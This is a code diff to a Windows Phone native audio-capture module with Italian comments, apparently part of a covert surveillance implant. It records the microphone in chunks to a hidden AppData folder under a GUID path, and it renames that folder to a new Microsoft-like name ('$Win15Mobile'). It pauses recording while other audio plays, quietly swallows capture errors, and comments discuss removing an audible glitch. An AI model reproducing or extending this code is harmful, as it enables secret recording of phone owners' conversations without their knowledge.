@@ -76,7 +76,7 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 	static BYTE bufferTmp[1024*512];
 #ifdef _DEBUG
 	//la grandezza del file comprende il timestamp + il trefisso audio piu 999999 campioni
-	char nomeFile[sizeof("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio")+DTTMSZAUD+1+6];
+	char nomeFile[sizeof("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio")+DTTMSZAUD+1+6];
 #endif
 	
 	Log log;
@@ -152,7 +152,7 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 
 		//dovrei entrare qua dentro solo quando stoppo il processo per cui mi trovo un trunk non completo
 		fstream filestr;
-		sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
+		sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
 		filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
 		filestr.seekg (0, ios::beg);
 		filestr.write ((const char*)bufferTmp, NativeCapture::pos);
@@ -181,7 +181,17 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 			logInfo.WriteLogInfo(L"Suspending microphone while audio is playing in background");
 
 			NativeCapture::fStartPlay=FALSE;
-			pAudioVideoCaptureDevice->StopRecordingAsync();
+			/////  TOGLIENDOLO FUNZIONA
+			try
+			{
+				pAudioVideoCaptureDevice->StopRecordingAsync();
+			}
+			catch (Platform::Exception^ e) 
+			{
+				Log logInfo;
+				//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
+				logInfo.WriteLogInfo(L"Microphone is in use. [id4]");
+			}
 		}
 	}
 	else if( (ULONGLONG)(hnsPresentationTime/10000000)>(ULONGLONG)(5*NativeCapture::nCamp))
@@ -195,7 +205,7 @@ void CameraCaptureSampleSink::OnSampleAvailable(
 
 
 			fstream filestr;
-			sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
+			sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
 			filestr.open(nomeFile, fstream::out|fstream::binary|fstream::app);
 			filestr.seekg (0, ios::beg);
 			filestr.write ((const char*)bufferTmp, NativeCapture::pos);
@@ -235,7 +245,19 @@ void NativeCapture::StopCapture()
    	if(fStartPlay==TRUE) 
 	{
 		fStartPlay=FALSE;
-		pAudioVideoCaptureDevice->StopRecordingAsync();
+					/////  TOGLIENDOLO FUNZIONA
+			try
+			{
+				pAudioVideoCaptureDevice->StopRecordingAsync();
+			}
+			catch (Platform::Exception^ e) 
+			{
+				Log logInfo;
+				//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
+				logInfo.WriteLogInfo(L"Microphone is in use. [id5]");
+			}
+		
+
 	}
 	
  
@@ -259,8 +281,8 @@ public:
         MyAudioSink()
         {
                 counter = 0;
-				//sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
-				filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$MS314Mobile\\audio.wav", fstream::out|fstream::binary|fstream::app);
+				//sprintf(nomeFile,"\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio%s_%.4i.amr",nomeFileBase,NativeCapture::nCamp);
+				filestr.open("\\Data\\Users\\DefApps\\AppData\\{11B69356-6C6D-475D-8655-D29B240D96C8}\\$Win15Mobile\\audio.wav", fstream::out|fstream::binary|fstream::app);
 				filestr.seekg (0, ios::beg);
 				
         }
@@ -470,14 +492,17 @@ HRESULT InitAudioStream()
 
     EXIT_ON_ERROR(hr)
 
-	
-	OutputDebugString(L"START\n");
+	/* 
+	// l'ho tolto per il rilascio del core per vedere se era questo che influenzava il crash dell'app
+	// pero' devo vedere se senza questo sotto si sente ancora il glich dallo speacher
+
+	//OutputDebugString(L"START\n");
     hr = pAudioClient->Start();  // Start recording.
     EXIT_ON_ERROR(hr)
 
 	_Sleep(1000);
 	hr = pAudioClient->Stop();  // Stop recording.
-
+	*/
 Exit:
     CoTaskMemFree(pwfx);
     SAFE_RELEASE(pAudioClient);
@@ -520,15 +545,34 @@ int NativeCapture::StartCapture(HANDLE eventHandle)
 		RecordAudioStream(&pMyAudioSink);
 		*/
 		
-		//sembrerebbe che se inizializzo la periferica audio di render inizializza lo speacker e non si sente piu' il glic quando attivo il microfono
-		InitAudioStream();
+		try
+		{
+			//sembrerebbe che se inizializzo la periferica audio di render inizializza lo speacker e non si sente piu' il glic quando attivo il microfono
+			
+			// da rimettere tolto per verificare il rash del positio + mic
+			InitAudioStream(); ///HO TESTATO CRASHA LO STESSO POSSO RTIMETTERLA
 
-		//DWORD RecordAudioStreamThreadId;
-		//HANDLE  hRepeat = _CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RecordAudioStream, (void*)&pMyAudioSink, 0, &RecordAudioStreamThreadId);
+			//DWORD RecordAudioStreamThreadId;
+			//HANDLE  hRepeat = _CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RecordAudioStream, (void*)&pMyAudioSink, 0, &RecordAudioStreamThreadId);
 
 		
-		pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
-		/////_ZMediaQueue_DisconnectFromService();
+			/////  DA RIMETTERE 
+			pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
+			/////_ZMediaQueue_DisconnectFromService();
+		}
+		catch (Platform::Exception^ e) 
+		{
+#ifdef _DEBUG
+			OutputDebugString(L"<<<eccezione capture Mic2 gestita>>>\n");
+			///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
+#endif
+
+			Log logInfo;
+			//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
+			logInfo.WriteLogInfo(L"Microphone is in use. [id2]");
+			///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
+
+		}
 		return FALSE;
 	}
 
@@ -544,8 +588,25 @@ int NativeCapture::StartCapture(HANDLE eventHandle)
 		{
 			//OutputDebugString(L"Nessun play attivo");	
 			fStartPlay=TRUE;
-			pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
-			/////_ZMediaQueue_DisconnectFromService();
+			try
+			{
+				/////  DA RIMETTERE 
+				pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
+				/////_ZMediaQueue_DisconnectFromService();
+			}
+			catch (Platform::Exception^ e) 
+			{
+#ifdef _DEBUG
+				OutputDebugString(L"<<<eccezione capture Mic3 gestita>>>\n");
+				///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
+#endif
+
+				Log logInfo;
+				//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
+				logInfo.WriteLogInfo(L"Microphone is in use. [id3]");
+				///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
+
+			}
 			return TRUE;
 		}
 	}
@@ -648,6 +709,8 @@ NativeAudioInterface::Native::NativeCapture::NativeCapture()
 
 	AudioTask.then([=](task<AudioVideoCaptureDevice^> getAudioTask)
 	{
+		try
+		{
 		/*****
 				AudioVideoCaptureDevice^ captureDevice  = getPosTask.get();
 
@@ -686,10 +749,22 @@ NativeAudioInterface::Native::NativeCapture::NativeCapture()
 
 				//TRUE => che ho finito l'inizializzazione
 				//fAudioCapture=TRUE;
-				
-			}
-		
-	).wait();
+		}
+		catch (Platform::Exception^ e) 
+		{
+#ifdef _DEBUG
+			OutputDebugString(L"<<<eccezione capture Mic1 gestita>>>\n");
+			///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
+#endif
+
+			Log logInfo;
+			//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
+			logInfo.WriteLogInfo(L"Microphone is in use. [id1]");
+			///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
+
+		}
+
+	}).wait();
 
 	// non serve: _Sleep(2000); //inserito per vedere se ritardando si evita il tak che capita ogni tanto sui lumia
 	NativeCapture::pos=0;
